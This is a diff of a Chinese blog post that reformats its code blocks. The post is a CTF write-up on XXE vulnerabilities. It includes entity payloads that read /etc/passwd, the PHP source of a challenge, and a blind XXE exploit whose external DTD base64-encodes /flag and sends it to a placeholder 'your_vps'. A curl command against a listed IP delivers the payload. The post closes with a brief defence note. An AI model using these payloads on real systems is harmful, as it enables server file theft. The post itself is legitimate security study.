@@ -126,14 +126,16 @@
 <h3 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h3><p>格式：<code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</code>，在xml里不给实体赋予具体的值，而是通过某URI引入，叫做外部实体引入</p>
 <p>下面是支持使用的URI<br><img src="https://thief.one/upload_image/20170620/1.png" alt></p>
 <p>关于外部实体引用file协议的例子如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;</span><br><span class="line">&lt;root&gt;&amp;file;&lt;/root&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;</span><br><span class="line">或者</span><br><span class="line">&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>外部引入参数实体的例子：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">    &lt;!ENTITY % name SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">    %name;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
-
-<p>注意:%name（参数实体）是<strong>在DTD中被引用</strong>的，而其余实体是在xml文档中被引用的。</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;
+&lt;root&gt;&amp;file;&lt;/root&gt;</code></pre><h3 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h3><pre><code>&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;
+或者
+&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;</code></pre><p>外部引入参数实体的例子：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE a [
+    &lt;!ENTITY % name SYSTEM &quot;file:///etc/passwd&quot;&gt;
+    %name;
+]&gt;</code></pre><p>注意:%name（参数实体）是<strong>在DTD中被引用</strong>的，而其余实体是在xml文档中被引用的。</p>
 <h2 id="什么是DTD"><a href="#什么是DTD" class="headerlink" title="什么是DTD"></a>什么是DTD</h2><p>W3C定义：DTD即文档类型定义（document type define）,可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。<br>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p>
 <p>我理解的DTD是构建一个区域，声明在区域中要引入的实体\元素</p>
 <h3 id="内部声明DTD"><a href="#内部声明DTD" class="headerlink" title="内部声明DTD"></a>内部声明DTD</h3><p>语法：<code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></p>
@@ -150,9 +152,55 @@
 <p><img src="https://i.loli.net/2019/01/06/5c31b29f0180e.png" alt></p>
 <h2 id="35CTF-Blind-XXE"><a href="#35CTF-Blind-XXE" class="headerlink" title="35CTF Blind XXE"></a>35CTF Blind XXE</h2><p>这个是XXE漏洞能够利用的普遍场景，一般能利用XXE的地方有回显的机率几乎为0。利用blind xxe把数据外带到自己的服务器</p>
 <h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  function __autoload($cls) &#123;</span><br><span class="line">    include $cls;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  class Black &#123;</span><br><span class="line">    public function __construct($string, $default, $keyword, $store) &#123;</span><br><span class="line">      if ($string) ini_set(&quot;highlight.string&quot;, &quot;#0d0d0d&quot;);</span><br><span class="line">      if ($default) ini_set(&quot;highlight.default&quot;, &quot;#0d0d0d&quot;);</span><br><span class="line">      if ($keyword) ini_set(&quot;highlight.keyword&quot;, &quot;#0d0d0d&quot;);</span><br><span class="line"></span><br><span class="line">      if ($store) &#123;</span><br><span class="line">            setcookie(&apos;theme&apos;, &quot;Black-&quot;.$string.&quot;-&quot;.$default.&quot;-&quot;.$keyword, 0, &apos;/&apos;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  class Green &#123;</span><br><span class="line">    public function __construct($string, $default, $keyword, $store) &#123;</span><br><span class="line">      if ($string) ini_set(&quot;highlight.string&quot;, &quot;#00fb00&quot;);</span><br><span class="line">      if ($default) ini_set(&quot;highlight.default&quot;, &quot;#00fb00&quot;);</span><br><span class="line">      if ($keyword) ini_set(&quot;highlight.keyword&quot;, &quot;#00fb00&quot;);</span><br><span class="line"></span><br><span class="line">      if ($store) &#123;</span><br><span class="line">            setcookie(&apos;theme&apos;, &quot;Green-&quot;.$string.&quot;-&quot;.$default.&quot;-&quot;.$keyword, 0, &apos;/&apos;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  if ($_=@$_GET[&apos;theme&apos;]) &#123;</span><br><span class="line">    if (in_array($_, [&quot;Black&quot;, &quot;Green&quot;])) &#123;</span><br><span class="line">      if (@class_exists($_)) &#123;</span><br><span class="line">        ($string = @$_GET[&apos;string&apos;]) || $string = false;</span><br><span class="line">        ($default = @$_GET[&apos;default&apos;]) || $default = false;</span><br><span class="line">        ($keyword = @$_GET[&apos;keyword&apos;]) || $keyword = false;</span><br><span class="line"></span><br><span class="line">        new $_($string, $default, $keyword, @$_GET[&apos;store&apos;]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; else if ($_=@$_COOKIE[&apos;theme&apos;]) &#123;</span><br><span class="line">    $args = explode(&apos;-&apos;, $_);</span><br><span class="line">    if (class_exists($args[0])) &#123;</span><br><span class="line">      new $args[0]($args[1], $args[2], $args[3], &apos;&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; else if ($_=@$_GET[&apos;info&apos;]) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
+<pre><code>&lt;?php
+  function __autoload($cls) {
+    include $cls;
+  }
 
-<p>关于代码逻辑部分简单说一下：</p>
+  class Black {
+    public function __construct($string, $default, $keyword, $store) {
+      if ($string) ini_set(&quot;highlight.string&quot;, &quot;#0d0d0d&quot;);
+      if ($default) ini_set(&quot;highlight.default&quot;, &quot;#0d0d0d&quot;);
+      if ($keyword) ini_set(&quot;highlight.keyword&quot;, &quot;#0d0d0d&quot;);
+
+      if ($store) {
+            setcookie(&#39;theme&#39;, &quot;Black-&quot;.$string.&quot;-&quot;.$default.&quot;-&quot;.$keyword, 0, &#39;/&#39;);
+      }
+    }
+  }
+
+  class Green {
+    public function __construct($string, $default, $keyword, $store) {
+      if ($string) ini_set(&quot;highlight.string&quot;, &quot;#00fb00&quot;);
+      if ($default) ini_set(&quot;highlight.default&quot;, &quot;#00fb00&quot;);
+      if ($keyword) ini_set(&quot;highlight.keyword&quot;, &quot;#00fb00&quot;);
+
+      if ($store) {
+            setcookie(&#39;theme&#39;, &quot;Green-&quot;.$string.&quot;-&quot;.$default.&quot;-&quot;.$keyword, 0, &#39;/&#39;);
+      }
+    }
+  }
+
+  if ($_=@$_GET[&#39;theme&#39;]) {
+    if (in_array($_, [&quot;Black&quot;, &quot;Green&quot;])) {
+      if (@class_exists($_)) {
+        ($string = @$_GET[&#39;string&#39;]) || $string = false;
+        ($default = @$_GET[&#39;default&#39;]) || $default = false;
+        ($keyword = @$_GET[&#39;keyword&#39;]) || $keyword = false;
+
+        new $_($string, $default, $keyword, @$_GET[&#39;store&#39;]);
+      }
+    }
+  } else if ($_=@$_COOKIE[&#39;theme&#39;]) {
+    $args = explode(&#39;-&#39;, $_);
+    if (class_exists($args[0])) {
+      new $args[0]($args[1], $args[2], $args[3], &#39;&#39;);
+    }
+  } else if ($_=@$_GET[&#39;info&#39;]) {
+    phpinfo();
+  }
+
+  highlight_file(__FILE__);</code></pre><p>关于代码逻辑部分简单说一下：</p>
 <p>theme、string、default、keyword参数决定cookie，如果cookie存在则对cookie的四个参数以“-”号分割处理：把第一部分当作类名、其余三部分当作初始参数进行实例化。</p>
 <p>__autoload()方法没什么用，因为php7.2+以后此方法被废弃了，而环境刚好是7.21，所以是出题人用来混淆的。</p>
 <p>既然代码没什么可用的类，就看看能不能实例化可以用的php原生类，这里复盘，SimpleXMlElement可用</p>
@@ -162,20 +210,31 @@
 <p>所以思路就是Blind XXE，让服务器远程解析我们服务器上的xml，获取的数据再次发送到我们的服务器上。</p>
 <p>一开始构造xml的poc花了半天时间，主要踩了两个坑：</p>
 <p>1、在内部DTD声明中，参数实体不能嵌套参数实体使用，即下方的用法是不允许的，：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % file &quot;hpdoger&quot;&gt;</span><br><span class="line">&lt;!ENTITY % send SYSTEM &apos;http://vps/?file=%file;&apos;&gt;</span><br><span class="line"></span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
 
-<p>只能引入外部声明DTD才能进行<strong>参数实体嵌套使用</strong>，但是嵌套使用还必须满足下面的一个条件</p>
+&lt;!DOCTYPE ANY[
+
+&lt;!ENTITY % file &quot;hpdoger&quot;&gt;
+&lt;!ENTITY % send SYSTEM &#39;http://vps/?file=%file;&#39;&gt;
+
+%send;
+]&gt;</code></pre><p>只能引入外部声明DTD才能进行<strong>参数实体嵌套使用</strong>，但是嵌套使用还必须满足下面的一个条件</p>
 <p>2、 这点是key师傅点播到的：在引入外部DTD声明之后，想要嵌套其它参数实体就必须要用一个“中间参数实体”去搭桥，这个中间参数实体可以理解为eval。具体实现方法看下面的POC</p>
 <h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>vps上的xml文件如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % send SYSTEM &apos;http://your_vps/test2.dtd&apos;&gt;</span><br><span class="line"></span><br><span class="line">%send;</span><br><span class="line">%test;</span><br><span class="line">%back;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
 
-<p>vps上的外部DTD声明文件test2.dtd如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % test &quot;&lt;!ENTITY &amp;#37; back SYSTEM &apos;http://your_vps/?file=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+&lt;!DOCTYPE ANY[
 
-<p>用Curl发送请求，–cookie指定请求cookie参数</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v --cookie &quot;theme=SimpleXMlElement-http://your_vps/xxe.xml-2-true&quot; &quot;http://35.207.132.47:82&quot;</span><br></pre></td></tr></table></figure>
+&lt;!ENTITY % send SYSTEM &#39;http://your_vps/test2.dtd&#39;&gt;
 
-<p>查看web日志即能看到base64加密的flag<br><img src="https://i.loli.net/2019/01/06/5c31fa6b43153.png" alt></p>
+%send;
+%test;
+%back;
+]&gt;</code></pre><p>vps上的外部DTD声明文件test2.dtd如下：</p>
+<pre><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;
+
+&lt;!ENTITY % test &quot;&lt;!ENTITY &amp;#37; back SYSTEM &#39;http://your_vps/?file=%file;&#39;&gt;&quot;&gt;</code></pre><p>用Curl发送请求，–cookie指定请求cookie参数</p>
+<pre><code>curl -v --cookie &quot;theme=SimpleXMlElement-http://your_vps/xxe.xml-2-true&quot; &quot;http://35.207.132.47:82&quot;</code></pre><p>查看web日志即能看到base64加密的flag<br><img src="https://i.loli.net/2019/01/06/5c31fa6b43153.png" alt></p>
 <p>其中：</p>
 <ul>
 <li>外部实体send引入外部DTD声明</li>
@@ -202,8 +261,7 @@
 </ol>
 <h2 id="关于防御"><a href="#关于防御" class="headerlink" title="关于防御"></a>关于防御</h2><ol>
 <li><p>对于PHP，禁止引用外部实体</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(true);</span><br></pre></td></tr></table></figure>
-</li>
+<pre><code>libxml_disable_entity_loader(true);</code></pre></li>
 <li><p>对于其它语言，其实做好过滤就行了。但是很少见到用xml形式的数据传输了..说多了也没啥用</p>
 </li>
 </ol>
@@ -213,16 +271,16 @@
            
             <div class="copyright">
                 <div class="name">
-                    <a>本文作者:</a>
+                    <a>Author:</a>
                     <a>Sōsuke</a>
                 </div>
                 <div class="link">
-                    <a>本文链接:</a>
+                    <a>Link:</a>
                     <a class="permalink" href="https://hpdoger.cn/2019/01/07/从两道CTF题目学习XXE漏洞/">https://hpdoger.cn/2019/01/07/从两道CTF题目学习XXE漏洞/</a>
                 </div>
                 <div class="license">
-                    <a>版权声明:</a>
-                    <a>本博客所有文章除特别声明外，均采用许可协议 CC BY-NC-SA 3.0 CN。转载请注明出处！</a>
+                    <a>Statement:</a>
+                    <a>All articles in this blog shall be licensed by CC BY-NC-SA 3.0 CN, unless otherwise stated. Please indicate the provenance!</a>
                 </div>
             </div>
             
@@ -235,7 +293,7 @@
 
 <div class="tip">
 <button class="tip-btn">
-    打赏
+    Tip
 </button>
 <div class="tip-img">
 <ul>
